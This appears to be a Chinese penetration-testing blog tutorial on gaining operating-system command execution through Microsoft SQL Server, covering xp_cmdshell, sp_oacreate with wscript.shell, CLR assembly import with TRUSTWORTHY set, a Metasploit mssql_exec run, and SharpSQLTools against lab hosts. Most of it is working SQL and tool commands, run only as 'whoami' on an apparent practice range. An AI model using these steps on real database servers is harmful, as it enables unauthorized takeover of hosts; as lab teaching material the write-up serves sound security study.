前期渗透可以参考 [SQL server口令爆破](https://p7ivesc.github.io/post/SQL%20server-kou-ling-bao-po.html)

“存储过程”：其实质就是一个“集合”，那么是什么样的集合呢，就是存储在SQL server中预先定义好的“SQL语句集合”，说的更直白一些就是使用T-SQL语言编写好的各种小脚本共同组成的集合体，我们称之为“存储过程”。而存储过程中的这些小脚本中，其危险性最高的“小脚本”就是扩展存储过程中的 “xp_cmdshell脚本”，它可以执行操作系统的任何指令。

## xp_cmdshell

## 1.检查xp_cmdshell是否开启

```sql
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/944b8d7acf61.png)

## 2.开启xp_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1; 
RECONFIGURE; 
EXEC sp_configure 'xp_cmdshell', 1; 
RECONFIGURE;
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/81266a7d34db.webp)

## 3.命令执行

```sql
master..xp_cmdshell 'whoami';
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f4c0297e48f2.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/69d0167a81b5.png)

## msf模块 auxiliary/admin/mssql/mssql_exec

```sql
msf > use auxiliary/admin/mssql/mssql_exec
msf auxiliary(admin/mssql/mssql_exec) > set RHOSTS 10.3.4.119
RHOSTS => 10.3.4.119
msf auxiliary(admin/mssql/mssql_exec) > set PASSWORD Admin123
PASSWORD => Admin123
msf auxiliary(admin/mssql/mssql_exec) > run
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f7a2d0582bfa.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/b35f876b4ee7.png)

## sp_oacreate

使用sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE

对象），利用OLE对象的run方法执行系统命令。

在oacreate的官方文档里明确指出了，如果要使用OLE对象，必须要开启 'Ole Automation Procedures'，

也就是

EXEC sp_configure 'Ole Automation Procedures', 1;

执行这条语句前要执行

EXEC sp_configure 'show advanced options', 1;

## 1.检查sp_oacreate是否开启

```sql
SELECT * FROM sys.configurations WHERE name = 'ole automation procedures';
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f3c964d730f3.png)

## 2.开启sp_oacreate

```sql
EXEC sp_configure 'show advanced options', 1; 
RECONFIGURE; 
EXEC sp_configure 'ole automation procedures', 1; 
RECONFIGURE;
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ebc06439751a.png)

## 3.执行命令

```sql
--使用sp_oacreate调用wscript.shell组件，将返回的对象存储到@shell变量中。
declare @shell int 
exec sp_oacreate 'wscript.shell',@shell output 
-- 使用sp_oamethod 调用@shell对象中的Run方法，执行添加用户的命令，null是run方法的返回值，我们不需要用返回值，所以写null.
exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >C:\\1.txt'
```

使用上述的sp_oacreate调用wscript.shell的run方法执行命令重定向

输出到文件是没有回显的，但是wscript.shell还有一个exec方法能够直

接获取输出，使得sp_oacreate方法执行命令能够回显内容

```sql
-- 调用exec方法实现回显
declare @luan int,@exec int,@text int,@str varchar(8000);
exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@luan output;     
exec sp_oamethod @luan,'exec',@exec output,'cmd.exe /c whoami';
exec sp_oamethod @exec, 'StdOut', @text out;
exec sp_oamethod @text, 'readall', @str out
select @str;
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/dcb8995fada5.png)

## CLR利用

什么是CLR：

CLR微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server

集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这

意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和

Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义

聚合和流式表值函数。

简单的说，可以看做成mssql的udf提权，不过可以直接使用16进制代码来创建自定义

函数，不需要写文件，比较方便

## 1.MSSQL CLR功能默认关闭，利用以下语句启用

```sql
sp_configure 'clr enabled', 1 
GO 
RECONFIGURE 
GO
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/55cc5889410c.png)

## 2.为了导入了不安全的程序集，我们还需要执行以下语句将数据库标记为安全。

```sql
ALTER DATABASE master SET TRUSTWORTHY ON
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/5873e771ea80.png)

## 3.利用SQL语句导入程序集。

```sql
CREATE ASSEMBLY [luan_exec] 
FROM 0x4D5A9000030000000…… 
WITH PERMISSION_SET = UNSAFE; 
GO
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/5c3a0be737ce.png)

因为是共有靶场，可能已经有了

## 4.创建存储过程。

```sql
CREATE FUNCTION dbo.shell(@exe as nvarchar(2000),@arg as nvarchar(2000)) 
RETURNS nvarchar(2000) 
AS EXTERNAL NAME luan_exec.[luan.cmd].run 
GO
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/620d20148d7f.png)

## 5.执行命令。

```sql
SELECT dbo.shell('cmd.exe','/c whoami')
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7c0a9f5bbf0c.png)

## 综合工具 SharpSQLTools

https://github.com/uknowsec/SharpSQLTools

```bash
.\SharpSQLTools.exe 10.3.4.118 sa Admin123 master enable_clr
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/72b8d72be876.png)

```bash
.\SharpSQLTools.exe 10.3.4.118 sa Admin123 master install_clr
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/347f6323010a.png)

```bash
.\SharpSQLTools.exe 10.3.4.118 sa Admin123 master clr_exec whoami
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a20efd9535c2.png)

<!-- build: 2026-11-06 11:54:39 -->